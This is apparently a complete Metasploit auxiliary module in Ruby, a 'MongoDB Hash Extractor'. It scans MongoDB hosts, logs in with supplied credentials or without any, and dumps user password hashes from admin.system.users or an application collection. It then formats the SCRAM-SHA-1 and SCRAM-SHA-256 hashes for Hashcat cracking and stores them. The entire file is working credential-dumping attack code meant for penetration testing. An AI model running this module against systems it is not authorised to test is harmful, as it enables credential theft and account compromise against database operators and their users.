##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'bson'
require 'openssl'
require 'digest'
require 'base64'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Mongodb
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MongoDB Hash Extractor',
        'Description' => %q{
          This module extracts password hashes from a MongoDB instance and stores
          them in the database for later cracking. By default, it dumps system user
          credentials from the 'system.users' collection. Alternatively,
          it can dump application user hashes from a specified collection.
          On MongoDB 3.0+ all users are stored in admin.system.users regardless
          of their authentication database, so the default DB of 'admin' is
          normally correct, and the querying user needs privileges
          (root, userAdminAnyDatabase, readAnyDatabase) to read them.

          The dumped SCRAM hashes are formatted for Hashcat mode 24100 (SCRAM-SHA-1)
          and 24200 (SCRAM-SHA-256), but are not yet wired into Metasploit's
          auxiliary/analyze cracking modules -- use hashcat directly against the
          exported hash, or 'creds -o' to export it, for now.
          Successfully tested against MongoDB 3.6 with and without authentication
        },
        'References' => [
          [ 'URL', 'https://docs.mongodb.com/manual/reference/mongodb-wire-protocol/' ],
          [ 'URL', 'https://github.com/mongodb/specifications/blob/master/source/auth/auth.rst/' ],
          [ 'URL', 'https://hashcat.net/wiki/doku.php?id=example_hashes' ]
        ],
        'Author' => [
          'h00die',
          'prithvee07'
        ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Reliability' => [],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        Opt::RPORT(27017),
        OptString.new('DB', [ true, 'Database to query', 'admin']),
        OptString.new('COLLECTION', [ false, 'Custom collection to dump (if empty, dumps system.users)', '']),
        OptString.new('USER_FIELD', [ false, 'Username field name for custom collection', 'username']),
        OptString.new('HASH_FIELD', [ false, 'Hash field name for custom collection', 'hash'])
      ]
    )
  end

  def run_host(ip)
    print_status("Connecting to #{ip}...")
    begin
      connect

      if require_auth?
        user = datastore['USERNAME']
        pass = datastore['PASSWORD']
        if user.blank? || pass.blank?
          print_error('Authentication required but no USERNAME/PASSWORD provided')
          return
        end

        print_status("Authentication required, attempting login as '#{user}'...")
        mechanism = authenticate(user: user, pass: pass, db: datastore['AUTH_DB'])
        if mechanism
          print_good("Successfully authenticated via #{mechanism}")
          report_cred(
            ip: rhost,
            port: rport,
            service_name: 'mongodb',
            user: user,
            password: pass,
            proof: "authenticated via #{mechanism}"
          )
        else
          print_error('Login failed')
          return
        end
      else
        print_good('No authentication required')
      end

      if datastore['COLLECTION'].blank?
        dump_system_users
      else
        dump_app_users
      end
    rescue StandardError => e
      print_error("Unable to connect: #{e}")
    ensure
      disconnect
    end
  end

  def dump_system_users
    db = datastore['DB']
    print_status("Dumping MongoDB system users from #{db}.system.users...")

    # numberToReturn 0 lets the server pick its default batch size and keeps
    # the cursor open; mongodb_query_all drains it with getMore so users past
    # the first batch are also dumped.
    cmd = BSON::Document.new({})
    docs = mongodb_query_all(sock, "#{db}.system.users", cmd.to_bson.to_s, timeout: 10)

    if (error = mongodb_query_error(docs))
      print_error("Query on #{db}.system.users failed: #{error}")
      if db != 'admin'
        print_error('On MongoDB 3.0+ users live in admin.system.users no matter which database')
        print_error('they authenticate against, and only privileged users can read it. Re-run with')
        print_error('DB=admin and a user holding root / userAdminAnyDatabase / readAnyDatabase.')
      end
      return
    end

    if docs.empty? && db != 'admin'
      # MongoDB 3.0+ keeps every user in admin.system.users; fall back to it
      # when the configured database has no system.users collection of its own.
      print_status("#{db}.system.users is empty, falling back to admin.system.users...")
      docs = mongodb_query_all(sock, 'admin.system.users', cmd.to_bson.to_s, timeout: 10)
      if (error = mongodb_query_error(docs))
        print_error("Query on admin.system.users failed: #{error}")
        return
      end
    end

    if docs.empty?
      print_warning('No users found or unable to parse')
      return
    end

    tbl = Rex::Text::Table.new(
      'Header' => 'MongoDB System Hashes',
      'Columns' => ['Type', 'Username', 'Hash']
    )

    service_data = {
      address: ::Rex::Socket.getaddress(rhost, true),
      port: rport,
      service_name: 'mongodb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    docs.each do |doc|
      user = doc['user']
      creds = doc['credentials'] || {}

      # SCRAM-SHA-1 (Hashcat 24100)
      if creds['SCRAM-SHA-1']
        s1 = creds['SCRAM-SHA-1']
        b64_user = Base64.strict_encode64(user)
        hash = "$mongodb-scram$*0*#{b64_user}*#{s1['iterationCount']}*#{s1['salt']}*#{s1['serverKey']}"
        tbl << ['db (SCRAM-SHA-1)', user, hash]

        store_hash_credential(service_data, user, hash, 'mongodb-scram-sha1')
      end

      # SCRAM-SHA-256 (Hashcat 24200)
      if creds['SCRAM-SHA-256']
        s256 = creds['SCRAM-SHA-256']
        b64_user = Base64.strict_encode64(user)
        hash = "$mongodb-scram$*1*#{b64_user}*#{s256['iterationCount']}*#{s256['salt']}*#{s256['serverKey']}"
        tbl << ['db (SCRAM-SHA-256)', user, hash]

        store_hash_credential(service_data, user, hash, 'mongodb-scram-sha256')
      end

      # MONGODB-CR Legacy (Plain MD5)
      next unless doc['pwd'] && !creds.key?('SCRAM-SHA-1') && !creds.key?('SCRAM-SHA-256')

      hash = doc['pwd']
      tbl << ['db (MONGODB-CR)', user, hash]

      store_hash_credential(service_data, user, hash, 'md5')
    end

    print_good("\n#{tbl}")
  end

  def dump_app_users
    coll = datastore['COLLECTION']
    user_field = datastore['USER_FIELD']
    hash_field = datastore['HASH_FIELD']
    db = datastore['DB']

    print_status("Dumping app hashes from #{db}.#{coll} (Field: #{user_field}:#{hash_field})...")

    cmd = BSON::Document.new({
      hash_field => { '$exists' => true, '$ne' => '' }
    })
    docs = mongodb_query_all(sock, "#{db}.#{coll}", cmd.to_bson.to_s, timeout: 10)

    if (error = mongodb_query_error(docs))
      print_error("Query on #{db}.#{coll} failed: #{error}")
      return
    end

    if docs.empty?
      print_warning('No users found or unable to parse')
      return
    end

    tbl = Rex::Text::Table.new(
      'Header' => 'MongoDB Application Hashes',
      'Columns' => ['Type', 'Username', 'Hash']
    )

    service_data = {
      address: ::Rex::Socket.getaddress(rhost, true),
      port: rport,
      service_name: 'mongodb',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    docs.each do |doc|
      user = doc[user_field].to_s
      hash = doc[hash_field].to_s

      next if user.blank? || hash.blank?

      tbl << ['app', user, hash]

      store_hash_credential(service_data, user, hash)
    end

    print_good("\n#{tbl}")
  end

  def store_hash_credential(service_data, username, hash, jtr_format = nil)
    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: username,
      private_data: hash,
      private_type: :nonreplayable_hash
    }
    credential_data[:jtr_format] = jtr_format if jtr_format
    credential_data.merge!(service_data)

    create_credential(credential_data)
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
